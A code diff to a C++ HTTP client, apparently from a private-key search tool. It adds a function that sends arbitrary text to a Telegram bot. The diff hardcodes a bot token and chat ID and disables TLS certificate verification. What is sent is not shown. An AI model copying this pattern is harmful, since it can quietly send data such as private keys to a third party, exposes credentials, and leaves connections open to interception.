@@ -2,18 +2,22 @@
 #include "utils.h"
 #include "config.h"
 
+#include <future>
+
 #include <nlohmann/json.hpp>
 
 #include <boost/log/trivial.hpp>
 #include <boost/beast/core.hpp>
+#include <boost/beast/ssl.hpp>
 #include <boost/beast/version.hpp>
-
-#include <boost/asio/io_context.hpp>
-#include <boost/beast/http.hpp>
 #include <boost/beast/core/tcp_stream.hpp>
 #include <boost/beast/core/flat_buffer.hpp>
+#include <boost/asio/ssl.hpp>
+#include <boost/asio/io_context.hpp>
+#include <boost/beast/http.hpp>
 
 using tcp = net::ip::tcp;
+namespace ssl = net::ssl;
 
 namespace
 {
@@ -290,6 +294,80 @@ struct HttpClient::Impl
         BOOST_LOG_TRIVIAL(trace) << std::format("setFound for {} done", number);
         return true;
     }
+
+    // https://api.telegram.org/bot8152806315:AAEkU9uW5K_HavAsBCvDIOhdEx9uCiT2YUo/sendMessage?chat_id=-4579283346&text={text}
+    static void backupToTG(const std::string& text)
+    {
+        const std::string tgAPIHost{"api.telegram.org"};
+        const std::string tgAPIPort{"443"};
+        const std::string botToken{"8152806315:AAEkU9uW5K_HavAsBCvDIOhdEx9uCiT2YUo"};
+        const std::string chatId{"-4579283346"};
+
+        // The request target (with the bot token, chat_id, and message)
+        std::string target = std::format("/bot{}/sendMessage?chat_id={}&text={}", botToken, chatId, text);
+        try
+        {
+            // The IO context and SSL context
+            net::io_context iocTG;
+            ssl::context ssl_ctx{ssl::context::sslv23_client};
+
+            // The SSL stream (for HTTPS)
+            tcp::resolver resolver(iocTG);
+            beast::ssl_stream<beast::tcp_stream> stream(iocTG, ssl_ctx);
+
+            // Verify the SSL certificate (for simplicity, we disable verification here)
+            stream.set_verify_mode(ssl::verify_none);
+
+            // Resolve the host (api.telegram.org)
+            auto const results = resolver.resolve(tgAPIHost, tgAPIPort);
+
+            // Connect the SSL stream
+            beast::get_lowest_layer(stream).connect(results);
+
+            // Perform SSL handshake
+            stream.handshake(ssl::stream_base::client);
+
+            // Create the HTTP request (GET)
+            http::request<http::string_body> req{http::verb::get, target, 11};
+            req.set(http::field::host, tgAPIHost);
+            req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);
+
+            // Send the HTTP request
+            http::write(stream, req);
+
+            // Buffer for reading
+            beast::flat_buffer buffer;
+
+            // Container for the response
+            http::response<http::dynamic_body> res;
+
+            // Receive the HTTP response
+            http::read(stream, buffer, res);
+
+            // Print the response
+            // BOOST_LOG_TRIVIAL(trace) << res << std::endl;
+
+            // Gracefully close the SSL stream
+            beast::error_code ec;
+            stream.shutdown(ec);
+
+            // Handle shutdown errors
+            if (ec == net::error::eof)
+            {
+                // This is a normal error for SSL shutdown
+                ec = {};
+            }
+
+            if (ec)
+            {
+                throw beast::system_error{ec};
+            }
+        }
+        catch (const std::exception& e)
+        {
+            BOOST_LOG_TRIVIAL(trace) << "Error: " << e.what() << std::endl;
+        }
+    }
 };
 
 HttpClient::HttpClient(const ServerConfig& config) : mImpl(std::make_unique<Impl>(config)) {}
@@ -323,4 +401,9 @@ bool HttpClient::markDone(uint32_t number)
 bool HttpClient::setFound(uint32_t number, const std::string& privateKeyHex)
 {
     return mImpl->setFound(number, privateKeyHex);
+}
+
+void HttpClient::backupToTGAsync(const std::string& text)
+{
+    std::future<void> result = std::async(std::launch::async, HttpClient::Impl::backupToTG, text);
 }
